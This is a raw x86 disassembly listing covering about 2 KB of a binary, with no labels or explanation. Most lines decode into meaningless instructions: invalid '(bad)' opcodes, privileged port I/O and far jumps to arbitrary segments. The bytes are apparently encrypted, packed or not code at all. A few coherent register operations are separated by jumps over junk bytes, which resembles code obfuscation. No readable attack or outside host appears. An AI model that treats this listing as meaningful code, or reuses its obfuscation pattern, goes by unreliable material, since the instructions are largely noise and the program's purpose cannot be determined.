  41be5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be5f:	jmp    0x6ae1:0x877c5e72
  41be66:	jo     0x41beb1
  41be68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be69:	xlat   BYTE PTR ds:[ebx]
  41be6a:	sar    DWORD PTR fs:[ebx+edx*2],0x2e
  41be6f:	nop
  41be70:	rcr    BYTE PTR [ebx],0xb7
  41be73:	loop   0x41be48
  41be75:	ret    0x97ad
  41be78:	xchg   edi,eax
  41be79:	fnstsw WORD PTR [ecx]
  41be7b:	ret    0x2ef7
  41be7e:	sub    eax,0x20fe62c1
  41be83:	mov    bl,BYTE PTR [ecx+0x2]
  41be86:	mov    esp,0x63f55fe3
  41be8b:	inc    edi
  41be8c:	adc    BYTE PTR [edx-0x7392092f],dh
  41be92:	push   esi
  41be93:	jae    0x41befc
  41be95:	lahf   
  41be96:	cmp    ebx,DWORD PTR [eax+0x34]
  41be99:	in     al,dx
  41be9a:	icebp  
  41be9b:	mov    bl,0x6b
  41be9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be9e:	jecxz  0x41bedd
  41bea0:	sub    eax,0xfba2d8eb
  41bea5:	jne    0x41c80b
  41beab:	jmp    0x41bf79
  41beb0:	out    dx,eax
  41beb1:	clc    
  41beb2:	outs   dx,DWORD PTR ds:[esi]
  41beb3:	inc    edi
  41beb4:	jg     0x41be8d
  41beb6:	out    dx,eax
  41beb7:	clc    
  41beb8:	rcl    DWORD PTR [eax-0x251085d5],cl
  41bebe:	add    esi,DWORD PTR [eax-0x6e]
  41bec1:	inc    ebx
  41bec2:	add    DWORD PTR [eax],eax
  41bec4:	mov    cl,0x0
  41bec6:	add    BYTE PTR [eax],al
  41bec8:	ins    DWORD PTR es:[edi],dx
  41bec9:	sbb    al,0xb1
  41becb:	and    edx,DWORD PTR [eax]
  41becd:	cli    
  41bece:	and    DWORD PTR [edx],esp
  41bed0:	sub    DWORD PTR ds:0xf96c6e67,0x4a64b8d6
  41beda:	or     al,0xd
  41bedc:	ins    DWORD PTR es:[edi],dx
  41bedd:	adc    al,0x70
  41bedf:	pop    edi
  41bee0:	push   eax
  41bee1:	push   cs
  41bee2:	test   DWORD PTR [ebx-0x34],ebp
  41bee5:	xor    edx,DWORD PTR ds:0x696f0733
  41beeb:	pusha  
  41beec:	out    0x15,eax
  41beee:	mov    esi,gs
  41bef0:	jle    0x41bf51
  41bef2:	sbb    ecx,DWORD PTR [ebx-0x3a3e1170]
  41bef8:	pop    esi
  41bef9:	cmp    eax,0x2532d7e4
  41befe:	fnstcw WORD PTR [esi+0x24]
  41bf01:	jge    0x41bf42
  41bf03:	daa    
  41bf04:	jae    0x41bec3
  41bf06:	sar    BYTE PTR [ebp-0x35],1
  41bf09:	mov    bh,0x5d
  41bf0b:	(bad)  
  41bf0c:	loopne 0x41bf17
  41bf0e:	das    
  41bf0f:	(bad)  
  41bf10:	stc    
  41bf11:	add    dl,BYTE PTR [esi+ebx*4]
  41bf14:	sbb    al,0x8a
  41bf16:	outs   dx,BYTE PTR ds:[esi]
  41bf17:	hlt    
  41bf18:	mov    esp,0xe557ec04
  41bf1d:	aad    0xe0
  41bf1f:	cli    
  41bf20:	and    ebp,DWORD PTR [ecx-0x19]
  41bf23:	ja     0x41bee4
  41bf25:	add    BYTE PTR [esi+0x55],bl
  41bf28:	adc    esi,esi
  41bf2a:	not    bl
  41bf2c:	jne    0x41bf5b
  41bf2e:	fbstp  TBYTE PTR [ecx]
  41bf30:	aaa    
  41bf31:	sub    eax,0x6e033eb7
  41bf36:	arpl   cx,bx
  41bf38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf39:	lahf   
  41bf3a:	ret    0x279
  41bf3d:	cmp    eax,0x8666b5b2
  41bf42:	mov    eax,DWORD PTR [ecx+0x7c]
  41bf45:	add    DWORD PTR [ecx+0x5c],eax
  41bf48:	ds jmp 0x41bf7d
  41bf4b:	mov    ds:0xad21a419,al
  41bf50:	mov    dl,0x57
  41bf52:	jae    0x41bf60
  41bf54:	xchg   edx,eax
  41bf55:	test   ecx,eax
  41bf57:	in     eax,0x80
  41bf59:	jle    0x41bf1b
  41bf5b:	iret   
  41bf5c:	ror    BYTE PTR [esi+0x719ac81a],cl
  41bf62:	jecxz  0x41bf93
  41bf64:	mov    edi,DWORD PTR [eax]
  41bf66:	mov    edx,0x3e6e6caa
  41bf6b:	xor    BYTE PTR [ecx],0x1f
  41bf6e:	xchg   ebp,eax
  41bf6f:	and    eax,0x61529ff4
  41bf74:	fwait
  41bf75:	add    DWORD PTR [eax+0x4d8b8645],esp
  41bf7b:	cld    
  41bf7c:	mov    eax,DWORD PTR [ebp-0x8]
  41bf7f:	imul   ecx,ecx,0xd24d9d8
  41bf85:	and    ecx,eax
  41bf87:	mov    eax,DWORD PTR [ebp-0xc]
  41bf8a:	mov    edx,DWORD PTR [ebp-0x4]
  41bf8d:	mov    esi,DWORD PTR [ebp-0x8]
  41bf90:	imul   edx,edx,0xd24d9d8
  41bf96:	jmp    0x41c064
  41bf9b:	inc    eax
  41bf9c:	fist   WORD PTR [esi-0x34]
  41bf9f:	(bad)  
  41bfa1:	fcmovu st,st(7)
  41bfa3:	cld    
  41bfa4:	ret    0x3336
  41bfa7:	retf   
  41bfa8:	lds    ebx,FWORD PTR [ecx+0x14443de]
  41bfae:	add    BYTE PTR [ecx-0x1e000000],dh
  41bfb4:	dec    ecx
  41bfb5:	jns    0x41bf40
  41bfb7:	sub    ebp,ebp
  41bfb9:	fdiv   DWORD PTR [ebx+0x1a6e1b30]
  41bfbf:	xor    al,0x7d
  41bfc1:	lahf   
  41bfc2:	adc    dh,cl
  41bfc4:	sahf   
  41bfc5:	cmp    eax,0x427bd0d3
  41bfca:	cmp    dl,ah
  41bfcc:	sub    BYTE PTR [esi-0x9],ah
  41bfcf:	pop    edx
  41bfd0:	cs jne 0x41c014
  41bfd3:	adc    ecx,edx
  41bfd5:	mov    ds:0x3c27b701,al
  41bfda:	dec    edx
  41bfdb:	loopne 0x41c026
  41bfdd:	call   DWORD PTR [esp+edx*8]
  41bfe0:	imul   eax,edi,0xa6225e03
  41bfe6:	jle    0x41bfdc
  41bfe8:	add    eax,edx
  41bfea:	bound  eax,QWORD PTR [ecx]
  41bfec:	dec    eax
  41bfed:	retf   
  41bfee:	gs jns 0x41c028
  41bff1:	mov    dl,0xa3
  41bff3:	shl    DWORD PTR [edx-0x5637879a],cl
  41bff9:	jmp    0x41c05c
  41bffb:	xor    ecx,edi
  41bffd:	hlt    
  41bffe:	bound  ebp,QWORD PTR [ebp-0x2b]
  41c001:	push   ebp
  41c002:	out    dx,eax
  41c003:	mov    dh,0x1f
  41c005:	jg     0x41bf96
  41c007:	mov    bl,0x5a
  41c009:	lea    edi,[edi+eiz*4-0x55]
  41c00d:	or     eax,0x5ad16711
  41c012:	pop    edi
  41c013:	pusha  
  41c014:	scas   eax,DWORD PTR es:[edi]
  41c015:	inc    edx
  41c016:	sub    edx,DWORD PTR [esi]
  41c018:	out    0xab,al
  41c01a:	push   eax
  41c01b:	repnz out dx,al
  41c01d:	je     0x41c035
  41c01f:	dec    edx
  41c020:	ss or  eax,0xd651b773
  41c026:	sbb    al,0xde
  41c028:	and    eax,0x419095c7
  41c02d:	mov    sp,0x62b9
  41c031:	fcom   DWORD PTR [eax-0x48ef12b5]
  41c037:	inc    edi
  41c038:	clc    
  41c039:	aaa    
  41c03a:	in     al,dx
  41c03b:	inc    ecx
  41c03c:	sbb    eax,0x71cc2e5d
  41c041:	repnz fisub DWORD PTR [edx+0xf]
  41c046:	xchg   edi,eax
  41c047:	int3   
  41c048:	icebp  
  41c049:	push   ss
  41c04a:	jp     0x41c022
  41c04c:	pop    ebp
  41c04d:	mov    bh,BYTE PTR [ebp-0x314b9e05]
  41c053:	jle    0x41c030
  41c055:	push   edi
  41c056:	and    bh,bl
  41c058:	adc    esi,edx
  41c05a:	sbb    dl,BYTE PTR [eax]
  41c05c:	aam    0x98
  41c05e:	dec    ecx
  41c05f:	in     al,0xc2
  41c061:	xor    eax,0xc80bc5de
  41c066:	and    edx,esi
  41c068:	mov    esi,DWORD PTR [ebp-0xc]
  41c06b:	jmp    0x41c139
  41c070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c071:	ret    0xf9b6
  41c074:	idiv   ch
  41c076:	out    dx,eax
  41c077:	ffreep st(7)
  41c079:	into   
  41c07a:	push   ds
  41c07b:	ret    
  41c07c:	out    0x2b,al
  41c07e:	nop
  41c07f:	xor    esi,esp
  41c081:	inc    esp
  41c082:	add    DWORD PTR [eax],eax
  41c084:	mov    cl,0x0
  41c086:	add    BYTE PTR [eax],al
  41c088:	je     0x41c07f
  41c08a:	or     al,0x7
  41c08c:	cmc    
  41c08d:	pop    ebx
  41c08e:	fsubrp st(0),st
  41c090:	xchg   ecx,eax
  41c091:	jb     0x41c025
  41c093:	stos   BYTE PTR es:[edi],al
  41c094:	pop    ebx
  41c095:	jae    0x41c104
  41c097:	sbb    al,BYTE PTR [edi+0x2f]
  41c09a:	retf   0x5192
  41c09d:	push   cs
  41c09e:	stos   DWORD PTR es:[edi],eax
  41c09f:	jne    0x41c0da
  41c0a1:	sub    ecx,DWORD PTR [ecx-0x86fa2a]
  41c0a7:	or     eax,0x828a105
  41c0ac:	sub    DWORD PTR [esi],ebx
  41c0ae:	aam    0x77
  41c0b0:	loop   0x41c093
  41c0b2:	adc    al,0x4f
  41c0b4:	loop   0x41c07f
  41c0b6:	retf   
  41c0b7:	int3   
  41c0b8:	xchg   ebp,eax
  41c0b9:	add    BYTE PTR [eax-0x54],ah
  41c0bc:	and    al,0x68
  41c0be:	and    esi,ebx
  41c0c0:	sub    edi,esi
  41c0c2:	dec    eax
  41c0c3:	(bad)  
  41c0c4:	sahf   
  41c0c5:	push   ebp
  41c0c6:	adc    ah,dh
  41c0c8:	test   eax,0x1c50cf0b
  41c0cd:	data16 daa 
  41c0cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0d0:	fist   WORD PTR [esi-0x7ce82c32]
  41c0d6:	jge    0x41c125
  41c0d8:	mov    ch,0xa
  41c0da:	repnz sub eax,0xd32cae5c
  41c0e0:	dec    ebp
  41c0e1:	jnp    0x41c070
  41c0e3:	js     0x41c0ab
  41c0e5:	jns    0x41c107
  41c0e7:	and    eax,0xb094d9c9
  41c0ec:	sub    eax,0xf243cb47
  41c0f1:	xchg   edx,eax
  41c0f2:	add    esp,ebp
  41c0f4:	mov    ch,0x36
  41c0f6:	cli    
  41c0f7:	xchg   edx,eax
  41c0f8:	into   
  41c0f9:	dec    esp
  41c0fa:	sub    BYTE PTR [edi-0x59],ah
  41c0fd:	jne    0x41c0ed
  41c0ff:	pusha  
  41c100:	xchg   ebx,eax
  41c101:	clc    
  41c102:	mov    ebp,0xa04dee6b
  41c107:	xchg   esi,eax
  41c108:	arpl   WORD PTR [edx],dx
  41c10a:	jle    0x41c0df
  41c10c:	and    eax,0x6e3ec917
  41c111:	sub    BYTE PTR [edi-0x24116177],cl
  41c117:	es (bad) 
  41c119:	in     eax,0x6f
  41c11b:	pop    eax
  41c11c:	lahf   
  41c11d:	(bad)  
  41c11e:	rcr    DWORD PTR [eax+ecx*8+0x67],cl
  41c122:	add    edi,DWORD PTR [eax]
  41c124:	test   DWORD PTR [edx],0x7df7f4a9
  41c12a:	cld    
  41c12b:	adc    edx,DWORD PTR [edi]
  41c12d:	lods   al,BYTE PTR ds:[esi]
  41c12e:	js     0x41c11d
  41c130:	adc    BYTE PTR [edx-0x611756be],bh
  41c136:	mov    dh,0x53
  41c138:	repnz mov eax,0x3cfa
  41c13e:	xor    ecx,eax
  41c140:	jmp    0x41c20e
  41c145:	adc    DWORD PTR [ecx],edx
  41c147:	adc    ecx,edi
  41c149:	adc    ecx,edi
  41c14b:	fstp   st(7)
  41c14d:	xlat   BYTE PTR ds:[ebx]
  41c14e:	sub    DWORD PTR [esi+ecx*2-0x32],0xa55f3a74
  41c156:	inc    ebp
  41c157:	add    DWORD PTR [eax],eax
  41c159:	mov    cl,0x0
  41c15b:	add    BYTE PTR [eax],al
  41c15d:	call   0x312995c1
  41c162:	imul   BYTE PTR [ecx+esi*8]
  41c165:	data16 cmp al,0x66
  41c168:	mov    BYTE PTR [esi+0x5a],ch
  41c16b:	mov    ebp,0x97dbe18e
  41c170:	cwde   
  41c171:	clc    
  41c172:	iretw  
  41c174:	cmp    eax,0xbbdb39c4
  41c179:	popa   
  41c17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c17b:	mov    al,0xfb
  41c17d:	hlt    
  41c17e:	xchg   esi,eax
  41c17f:	pop    es
  41c180:	daa    
  41c181:	(bad)  
  41c183:	in     eax,0x95
  41c185:	mov    bh,0x3b
  41c187:	adc    BYTE PTR [edx+0x3d],0xf9
  41c18b:	daa    
  41c18c:	pushf  
  41c18d:	push   edx
  41c18e:	fnstenv [edx+0x7d]
  41c191:	jns    0x41c1f1
  41c193:	repz es push edx
  41c196:	aaa    
  41c197:	pop    es
  41c198:	cmp    ah,BYTE PTR [ebp-0x8]
  41c19b:	xchg   edx,eax
  41c19c:	pusha  
  41c19d:	adc    BYTE PTR [ecx],0x8f
  41c1a0:	xor    eax,0x6a5514a8
  41c1a5:	frstor [ecx-0x4e]
  41c1a8:	enter  0x2ca,0x89
  41c1ac:	push   esi
  41c1ad:	gs in  eax,0x0
  41c1b0:	popf   
  41c1b1:	scas   eax,DWORD PTR es:[edi]
  41c1b2:	or     ch,BYTE PTR [edi+0x6c3cfef7]
  41c1b8:	mov    ds:0xa7ac9e79,al
  41c1bd:	mov    esp,0x755b8adc
  41c1c2:	jno    0x41c1ea
  41c1c4:	push   0x897daf66
  41c1c9:	cld    
  41c1ca:	dec    ebp
  41c1cb:	sbb    BYTE PTR [ebx+0x18d8e61d],bl
  41c1d1:	mov    BYTE PTR [ebp-0x37],ah
  41c1d4:	icebp  
  41c1d5:	lods   al,BYTE PTR ds:[esi]
  41c1d6:	sub    eax,0x343dbc4d
  41c1db:	scas   eax,DWORD PTR es:[edi]
  41c1dc:	jns    0x41c1b8
  41c1de:	mov    ebp,0x48d2a50c
  41c1e3:	dec    ebx
  41c1e4:	sbb    al,BYTE PTR [eax+0x75]
  41c1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e8:	mov    esi,0x17d9187d
  41c1ed:	arpl   WORD PTR [ebp-0x64a3346f],dx
  41c1f3:	pop    edx
  41c1f4:	dec    edx
  41c1f5:	enter  0x534d,0x6a
  41c1f9:	mov    al,ds:0x38aa7f2a
  41c1fe:	in     eax,dx
  41c1ff:	mov    ah,0x26
  41c201:	lahf   
  41c202:	aaa    
  41c203:	fidivr WORD PTR [edx+0x4e]
  41c206:	xor    DWORD PTR [eax],ebp
  41c208:	aaa    
  41c209:	call   0xe1c1:0x7ff5cbe4
  41c210:	push   es
  41c211:	or     edx,esi
  41c213:	xor    edx,eax
  41c215:	mov    eax,DWORD PTR [ebp+0x8]
  41c218:	mov    eax,DWORD PTR [ecx+eax*1+0x3c]
  41c21c:	jmp    0x41c2ea
  41c221:	sti    
  41c222:	dec    esp
  41c223:	out    dx,eax
  41c224:	inc    esp
  41c225:	jmp    edi
  41c227:	sti    
  41c228:	jmp    FWORD PTR [edx+0x36]
  41c22b:	and    bh,BYTE PTR [esi+edx*1+0x564e148a]
  41c232:	inc    esi
  41c233:	add    DWORD PTR [eax],eax
  41c235:	mov    cl,0x0
  41c237:	add    BYTE PTR [eax],al
  41c239:	xchg   esp,eax
  41c23a:	fnstcw WORD PTR [ecx+0x21df5f04]
  41c240:	jle    0x41c299
  41c242:	imul   edx,DWORD PTR [esi+0x2b291fd0],0xc98b9ca9
  41c24c:	dec    edi
  41c24d:	mov    bh,0xd2
  41c24f:	jmp    0x64b2:0xa2c8fec4
  41c256:	fs retf 0x7a2e
  41c25a:	mov    bl,BYTE PTR [edx+0x650e16f3]
  41c260:	sbb    eax,0x7b14fc00
  41c265:	int    0x81
  41c267:	pushf  
  41c268:	(bad)
  41c26b:	or     esi,ecx
  41c26d:	inc    ebx
  41c26e:	mov    edx,0xb6c692e1
  41c273:	cmp    al,0xe0
  41c275:	fcmovnu st,st(4)
  41c277:	hlt    
  41c278:	adc    DWORD PTR [ebx+0x386e2849],edx
  41c27e:	adc    dh,BYTE PTR [edi+0x67]
  41c281:	sbb    eax,0xb3fca802
  41c286:	push   esp
  41c287:	sub    DWORD PTR [ebp+0xd],0x7f
  41c28b:	punpcklwd mm5,DWORD PTR [edi-0x539d5b7b]
  41c292:	fst    st(4)
  41c294:	sub    BYTE PTR [eax+0x116bd72d],dl
  41c29a:	mov    cl,0x44
  41c29c:	dec    esi
  41c29d:	std    
  41c29e:	shl    BYTE PTR [edi],0x5d
  41c2a1:	jne    0x41c228
  41c2a3:	pop    ss
  41c2a4:	sub    ah,0x62
  41c2a7:	(bad)  
  41c2a8:	jb     0x41c30d
  41c2aa:	ret    0x2329
  41c2ad:	xchg   ecx,eax
  41c2ae:	mov    ch,0x8f
  41c2b0:	stc    
  41c2b1:	xchg   BYTE PTR [ecx],bl
  41c2b3:	retf   
  41c2b4:	pop    esp
  41c2b5:	fidivr DWORD PTR [esi-0x51]
  41c2b8:	rol    BYTE PTR [ebx+0x20e1d565],0x31
  41c2bf:	cmp    dh,ch
  41c2c1:	mov    esi,DWORD PTR [edi+0xe]
  41c2c4:	ror    BYTE PTR [edi],1
  41c2c6:	pop    esp
  41c2c7:	sti    
  41c2c8:	out    0x2b,eax
  41c2ca:	mov    BYTE PTR [edi+0xf],bl
  41c2cd:	xchg   DWORD PTR ds:0x7defe96,ebp
  41c2d3:	test   BYTE PTR [edx-0x77],0x18
  41c2d7:	shr    DWORD PTR [ecx+0x45],1
  41c2da:	mov    ecx,0x136a77ea
  41c2df:	jl     0x41c2d4
  41c2e1:	fs lahf 
  41c2e3:	das    
  41c2e4:	jb     0x41c297
  41c2e6:	inc    ebp
  41c2e7:	jmp    0x41c33a
  41c2e9:	mov    ecx,0xe9084d8b
  41c2ee:	leave  
  41c2ef:	add    BYTE PTR [eax],al
  41c2f1:	add    BYTE PTR [edx-0x1d],bh
  41c2f4:	pusha  
  41c2f5:	scas   eax,DWORD PTR es:[edi]
  41c2f6:	stc    
  41c2f7:	scas   eax,DWORD PTR es:[edi]
  41c2f8:	push   edi
  41c2fa:	lods   al,BYTE PTR ds:[esi]
  41c2fb:	sbb    esi,esp
  41c2fd:	imul   eax,DWORD PTR [ecx+0x7cdda1d],0xb1000147
  41c307:	add    BYTE PTR [eax],al
  41c309:	add    bh,ah
  41c30b:	mov    bl,BYTE PTR [edx+0x33]
  41c30e:	or     BYTE PTR [eax+0xb988cd6],ch
  41c314:	(bad)  
  41c315:	jmp    0xd957:0x198c9c29
  41c31c:	pop    ss
  41c31d:	test   DWORD PTR [eax-0x75],edi
  41c320:	dec    ebx
  41c321:	dec    esp
  41c322:	inc    esp
  41c323:	pushf  
  41c324:	bound  edx,QWORD PTR [edi+0x13947946]
  41c32a:	push   0x8
  41c32c:	cld    
  41c32d:	retf   0xeb4d
  41c330:	pusha  
  41c331:	rcl    DWORD PTR [ecx-0x17],cl
  41c334:	retf   
  41c335:	lock sbb esi,ecx
  41c338:	pop    ds
  41c339:	daa    
  41c33a:	adc    eax,0x79e8677f
  41c33f:	repnz pop eax
  41c341:	mov    ebx,0xe03891c6
  41c346:	push   ebp
  41c347:	push   edx
  41c348:	xor    dl,bl
  41c34a:	pop    es
  41c34b:	pop    ebx
  41c34c:	push   0x9b0ec540
  41c351:	loopne 0x41c3b0
  41c353:	adc    edx,esp
  41c355:	jmp    0x183b:0x1edc6669
  41c35c:	pop    esp
  41c35d:	jbe    0x41c2e3
  41c35f:	jne    0x41c3c2
  41c361:	lods   eax,DWORD PTR ds:[esi]
  41c362:	jb     0x41c3c7
  41c364:	test   DWORD PTR [ebx*1+0x5cc12ed7],0xe6648a77
  41c36f:	scas   al,BYTE PTR es:[edi]
  41c370:	pop    edx
  41c371:	cmp    esp,ecx
  41c373:	jns    0x41c3c7
  41c375:	push   esi
  41c376:	mov    ds:0x23a2b9c3,eax
  41c37b:	pop    ecx
  41c37c:	add    esp,esp
  41c37e:	sbb    bh,BYTE PTR [ebx-0x2679c548]
  41c384:	aaa    
  41c385:	mov    al,0x89
  41c387:	mov    bl,BYTE PTR [edx+ebp*8+0x3a876b5d]
  41c38e:	(bad)  
  41c38f:	lods   al,BYTE PTR ds:[esi]
  41c390:	jns    0x41c3f6
  41c392:	push   0xd2086933
  41c397:	stos   BYTE PTR es:[edi],al
  41c398:	imul   edx,esi,0x9312d25a
  41c39e:	pop    es
  41c39f:	pop    ebx
  41c3a0:	push   cs
  41c3a1:	xchg   ebp,eax
  41c3a2:	push   eax
  41c3a3:	rol    DWORD PTR [ecx+0xc],0xe7
  41c3a7:	cmp    eax,0xb615ed03
  41c3ac:	and    BYTE PTR ds:0xf8f345ac,bh
  41c3b2:	add    esi,0x14
  41c3b5:	bound  eax,QWORD PTR [esi]
  41c3b7:	aaa    
  41c3b8:	(bad)  
  41c3ba:	rol    DWORD PTR [ebx],1
  41c3bc:	ret    0xc9e9
  41c3bf:	add    BYTE PTR [eax],al
  41c3c1:	add    dh,ah
  41c3c3:	mov    dh,0x98
  41c3c5:	mov    esp,0xfee6bed8
  41c3ca:	or     ebp,DWORD PTR fs:[ecx-0x72]
  41c3ce:	outs   dx,DWORD PTR ds:[esi]
  41c3cf:	or     DWORD PTR ds:0x147b81c,esi
  41c3d5:	add    BYTE PTR [ecx-0x51000000],dh
  41c3db:	jge    0x41c3e4
  41c3dd:	enter  0xbaff,0xef
  41c3e1:	mov    eax,0xb630f25e
  41c3e6:	mov    WORD PTR [edi-0x2f2235c7],?
  41c3ec:	ins    DWORD PTR es:[edi],dx
  41c3ed:	retf   
  41c3ee:	jmp    0x41c41f
  41c3f0:	icebp  
  41c3f1:	ror    bl,cl
  41c3f3:	mov    ecx,0x4049a56b
  41c3f8:	and    ecx,DWORD PTR [ecx+edx*1-0x7f]
  41c3fc:	out    dx,eax
  41c3fd:	(bad)  
  41c3fe:	lods   eax,DWORD PTR ds:[esi]
  41c3ff:	gs push ebx
  41c401:	mov    BYTE PTR [esi-0x5a],0xdd
  41c405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c406:	dec    eax
  41c407:	icebp  
  41c408:	sbb    DWORD PTR [esi+edx*2+0x63c0ef84],esp
  41c40f:	(bad)
  41c413:	or     al,0x1a
  41c415:	pushf  
  41c416:	pop    edx
  41c417:	push   esi
  41c418:	dec    ebx
  41c419:	outs   dx,DWORD PTR ds:[esi]
  41c41a:	retf   
  41c41b:	sub    DWORD PTR [edi+0x47],esi
  41c41e:	call   0x5eb2:0xfeb0167c
  41c425:	mov    WORD PTR [ebx+0x4e],gs
  41c428:	(bad)  
  41c429:	clc    
  41c42a:	xor    dl,cl
  41c42c:	inc    ecx
  41c42d:	pusha  
  41c42e:	fwait
  41c42f:	shl    bl,1
  41c431:	sahf   
  41c432:	xchg   edx,eax
  41c433:	adc    al,0x74
  41c435:	aad    0xf
  41c437:	fwait
  41c438:	stos   DWORD PTR es:[edi],eax
  41c439:	int3   
  41c43a:	jmp    0x41c40f
  41c43c:	pop    eax
  41c43d:	sbb    dl,ch
  41c43f:	jmp    0x7b1f8f3a
  41c444:	mov    edx,0x60584d72
  41c449:	xchg   ebx,eax
  41c44a:	aad    0xb
  41c44c:	in     eax,0x75
  41c44e:	xor    dh,BYTE PTR [eax]
  41c450:	(bad)  
  41c451:	jp     0x41c41e
  41c453:	into   
  41c454:	in     eax,0x72
  41c456:	clc    
  41c457:	mov    edx,0x1685d7aa
  41c45c:	(bad)  
  41c45e:	fisttp DWORD PTR [esi]
  41c460:	push   esi
  41c461:	jmp    0x41c4d6
  41c463:	mov    bl,0xdf
  41c465:	push   0x64
  41c467:	les    eax,FWORD PTR [esp+ebp*8+0x74]
  41c46b:	stc    
  41c46c:	cs inc edi
  41c46e:	or     BYTE PTR [ecx-0x661c4c36],dl
  41c474:	loope  0x41c3fd
  41c476:	neg    ch
  41c478:	push   eax
  41c479:	push   edx
  41c47a:	ror    DWORD PTR [eax+ebp*8-0x3d736c03],cl
  41c481:	pop    ecx
  41c482:	xor    bl,dh
  41c484:	inc    esp
  41c485:	cs ins BYTE PTR es:[edi],dx
  41c487:	repnz aas 
  41c489:	in     eax,dx
  41c48a:	add    eax,DWORD PTR [ebx]
  41c48c:	enter  0x4d89,0x8
  41c490:	mov    eax,DWORD PTR [ebp-0x24]
  41c493:	mov    ecx,DWORD PTR [ebp+0x8]
  41c496:	add    eax,0x20db
  41c49b:	jmp    0x41c569
  41c4a0:	sub    esp,ebp
  41c4a2:	js     0x41c519
  41c4a4:	(bad)  
  41c4a5:	std    
  41c4a6:	das    
  41c4a7:	jmp    FWORD PTR [esi]
  41c4a9:	int3   
  41c4aa:	add    al,BYTE PTR [edx]
  41c4ac:	push   esi
  41c4ad:	xchg   esi,eax
  41c4ae:	sahf   
  41c4af:	or     eax,0x14869
  41c4b4:	mov    cl,0x0
  41c4b6:	add    BYTE PTR [eax],al
  41c4b8:	add    al,0xc2
  41c4ba:	sbb    eax,0x23e972d6
  41c4bf:	mov    ds:0x7db770ae,al
  41c4c4:	inc    eax
  41c4c5:	(bad)  
  41c4c7:	and    dl,bl
  41c4c9:	xchg   ebp,eax
  41c4ca:	(bad)  
  41c4cb:	shl    DWORD PTR [esi-0x1e386dbd],1
  41c4d1:	loope  0x41c45a
  41c4d3:	sbb    eax,0x72ebd73a
  41c4d8:	mov    esi,DWORD PTR [edx+0x46]
  41c4db:	ins    DWORD PTR es:[edi],dx
  41c4dc:	push   ebx
  41c4dd:	or     eax,0x93a4a0ad
  41c4e2:	inc    esp
  41c4e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4e4:	and    ebx,DWORD PTR [esi]
  41c4e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e7:	inc    esi
  41c4e8:	pop    edx
  41c4e9:	aaa    
  41c4ea:	adc    bl,0x5f
  41c4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4ee:	sbb    ah,BYTE PTR [esi]
  41c4f0:	das    
  41c4f1:	jp     0x41c490
  41c4f3:	jge    0x41c56d
  41c4f5:	push   eax
  41c4f6:	(bad)  
  41c4f7:	mov    al,ds:0xa875500a
  41c4fc:	in     al,dx
  41c4fd:	xor    ch,BYTE PTR [ebx+edx*8]
  41c500:	shl    BYTE PTR [edx],1
  41c502:	jbe    0x41c4a0
  41c504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c505:	pop    ebp
  41c506:	lds    ebx,FWORD PTR [ebx]
  41c508:	and    BYTE PTR [eax-0x6f59693c],ah
  41c50e:	xor    ch,al
  41c510:	dec    edx
  41c511:	fst    QWORD PTR ds:0xc7f0ec79
  41c517:	call   0x11444642
  41c51c:	cmc    
  41c51d:	inc    eax
  41c51e:	out    0x4,al
  41c520:	adc    DWORD PTR [ecx],edi
  41c522:	push   eax
  41c523:	sbb    esp,DWORD PTR [eax]
  41c525:	inc    eax
  41c526:	stc    
  41c527:	in     al,dx
  41c528:	push   ecx
  41c529:	inc    esi
  41c52a:	out    dx,eax
  41c52b:	push   ebp
  41c52c:	aaa    
  41c52d:	sti    
  41c52e:	and    bl,BYTE PTR [esi]
  41c530:	pop    eax
  41c531:	cdq    
  41c532:	popa   
  41c533:	test   eax,0xdc52cd25
  41c538:	pop    ss
  41c539:	cdq    
  41c53a:	sbb    eax,0x32b1e15d
  41c53f:	mov    ch,0x41
  41c541:	(bad)  
  41c542:	sub    BYTE PTR [eax+eiz*4+0x11],al
  41c546:	in     eax,0x66
  41c548:	sub    al,BYTE PTR [edx+0x143b8233]
  41c54e:	repz and dh,BYTE PTR [esi]
  41c551:	in     eax,dx
  41c552:	bound  edi,QWORD PTR ds:0xb4cb23ea
  41c558:	sub    al,bh
  41c55a:	mul    eax
  41c55c:	mov    ebx,0xfc18169e
  41c561:	dec    edi
  41c562:	mov    ebp,0x1351c0
  41c567:	jns    0x41c4ed
  41c569:	xor    eax,0x7e18
  41c56e:	jmp    0x41c63c
  41c573:	or     BYTE PTR [ecx-0x75],0x5e
  41c577:	retf   
  41c578:	(bad)  
  41c57a:	fstp   st(7)
  41c57c:	and    al,0xfe
  41c57e:	mov    eax,ds:0xdecc55f
  41c583:	sbb    cl,BYTE PTR [ecx+0x1]
  41c586:	add    BYTE PTR [ecx-0x11000000],dh
  41c58c:	inc    esp
  41c58d:	xchg   edi,eax
  41c58e:	xchg   ecx,eax
  41c58f:	and    al,0x99
  41c591:	and    DWORD PTR [ebp+esi*4-0x63f7016a],eax
  41c598:	leave  
  41c599:	mov    ebx,0xb5afde14
  41c59e:	sbb    eax,0x62b15e21
  41c5a3:	mov    cs,WORD PTR [esi+0x36]
  41c5a6:	clc    
  41c5a7:	fmul   QWORD PTR [eax-0x14]
  41c5aa:	dec    eax
  41c5ab:	mov    DWORD PTR [ecx-0x590388d9],edx
  41c5b1:	out    0x2c,eax
  41c5b3:	xor    DWORD PTR [ebx+0x88726e4],ebp
  41c5b9:	pop    ss
  41c5ba:	jmp    FWORD PTR [edx]
  41c5bc:	int    0x9b
  41c5be:	xchg   BYTE PTR [esi+edi*8+0x6df5bd3f],bl
  41c5c5:	add    bh,BYTE PTR [ecx]
  41c5c7:	das    
  41c5c8:	mov    ch,0xb8
  41c5ca:	inc    ebp
  41c5cb:	ds cmp al,0xc6
  41c5ce:	sti    
